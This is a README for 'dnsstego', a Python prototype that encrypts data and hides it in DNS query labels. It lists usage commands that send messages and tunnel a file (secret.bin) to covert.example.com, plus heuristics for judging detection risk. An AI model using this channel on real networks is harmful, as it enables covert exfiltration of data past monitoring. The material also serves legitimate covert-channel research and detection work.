# dnsstego

Prototype toolkit for hiding encrypted data inside DNS queries. The project provides
building blocks for encoding payloads into domain labels, dispatching them over the
network, and recovering the secret on the receiving side.

## Features

- **AES encryption** of payloads before transport.
- **Domain encoder/decoder** for Base32/Base64 based DNS labels.
- **Risk controller** that monitors the statistical footprint of generated domains.
- **DNS sender/listener** wrappers around `dnslib` for quick experimentation.
- **Command line interface** with `send`, `receive`, and `tunnel` sub-commands.

## Installation

```bash
python -m venv .venv
source .venv/bin/activate
pip install -r requirements.txt
```

## Usage

### Send a message via DNS

```bash
python main.py send \
    --message "hello covert world" \
    --password mysecret \
    --base-domain covert.example.com \
    --server 8.8.8.8
```

Use `--dry-run` to inspect the generated domains without sending them.

### Receive and decode

```bash
python main.py receive \
    --password mysecret \
    --base-domain covert.example.com \
    --port 5353 \
    --timeout 10
```

Incoming queries are stored and decoded back into the original plaintext.

### Tunnel helper

The `tunnel` command prepares the sequence of domains and optionally sends them to the
configured resolver. It is useful for scripted experiments:

```bash
python main.py tunnel --file secret.bin --password mysecret --base-domain covert.example.com
```

## Configuration

Default values can be adjusted in `config/settings.yaml`.

## Development

The codebase is split into logical packages:

- `src/utils`: logging and cryptographic helpers.
- `src/stego`: encoding/decoding primitives and packet builders.
- `src/transport`: DNS send/receive abstractions and tunnel utilities.
- `src/agents`: heuristics that assess the detection risk.

Feel free to extend the risk model, add persistence layers, or integrate more advanced
traffic analysis modules.
